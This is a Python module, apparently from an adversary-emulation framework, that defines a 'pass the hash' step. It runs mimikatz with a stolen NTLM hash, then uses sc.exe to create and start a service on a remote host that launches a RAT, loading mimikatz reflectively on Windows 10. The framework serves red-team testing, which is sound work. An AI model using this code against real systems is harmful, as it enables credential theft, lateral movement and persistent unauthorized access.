from plugins.adversary.app.commands import sc
from plugins.adversary.app.commands.powershell import PSArg, PSFunction
from plugins.adversary.app.commands.mimikatz import MimikatzCommand, sekurlsa_pth, mimi_exit, privilege_debug
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar, OPService
from plugins.adversary.app.commands import parsers


class PassTheHashSc(Step):
    """
    Description:
        This step is a modified version of Pass the Hash that starts a service by stealing elevated credentials
        and passing them into a command prompt.
    Requirements:
        This step uses the Pass the Hash technique to copy a file to a target machine using xcopy.
    """
    attack_mapping = [('T1050', 'Persistence'), ('T1075', 'Lateral Movement'), ('T1021', 'Lateral Movement'), ('T1035', 'Execution'), ('T1106', 'Execution')]
    display_name = "pass_the_hash_sc"
    summary = ("Creates a service by using mimikatz's \"Pass the Hash\" function to inject a command prompt with "
               "elevated credentials")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("dest_host", OPHost),
                     ('rat_file', OPFile({'host': OPVar('dest_host'), 'use_case': 'rat'})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    # service_g properties are intentionally omitted here to prevent the planner from thinking it is useful
    postconditions = [("service_g", OPService),
                      ("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                       "executable": OPVar("rat_file.path")}))]

    preproperties = ['cred.hash', 'user.username', 'domain.windows_domain', 'rat_file.path',
                     'rat.host.os_version.major_version']

    not_equal = [("dest_host", "rat.host")]

    deterministic = True

    @staticmethod
    def description(dest_host, user):
        return "Using pass the hash with sc.exe to create and start a service on {} as {}".format(dest_host.fqdn, user.username)

    @staticmethod
    async def simulate(operation, rat, dest_host, rat_file, cred, user, domain, service_g, rat_g):
        return True

    @staticmethod
    async def action(operation, rat, dest_host, rat_file, cred, user, domain, service_g, rat_g):
        svcname = operation.adversary_artifactlist.get_service_word()

        remote_host = None
        if dest_host != rat.host:
            remote_host = dest_host.fqdn

        bin_path = rat_file.path

        create_command = MimikatzCommand(privilege_debug(),
                                         sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                      ntlm=cred.hash, run=sc.create(bin_path, svcname, remote_host=remote_host)[0].command_line),
                                         mimi_exit())

        start_command = MimikatzCommand(privilege_debug(),
                                        sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                     ntlm=cred.hash, run=sc.start(svcname, remote_host=remote_host)[0].command_line),
                                        mimi_exit())

        if rat.host.os_version.major_version >= 10:
            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
            await operation.reflectively_execute_exe(rat, "mimi64-exe", create_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)

            await service_g({'name': svcname, 'bin_path': rat_file.path, 'host': dest_host})

            await operation.reflectively_execute_exe(rat, "mimi64-exe", start_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)
        else:
            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", create_command.command)),
                                               parsers.mimikatz.sekurlsa_pth)

            await service_g({'name': svcname, 'bin_path': rat_file.path, 'host': dest_host})

            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", start_command.command)),
                                               parsers.mimikatz.sekurlsa_pth)
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, service_g):
        for service in service_g:
            await cleaner.delete(service)
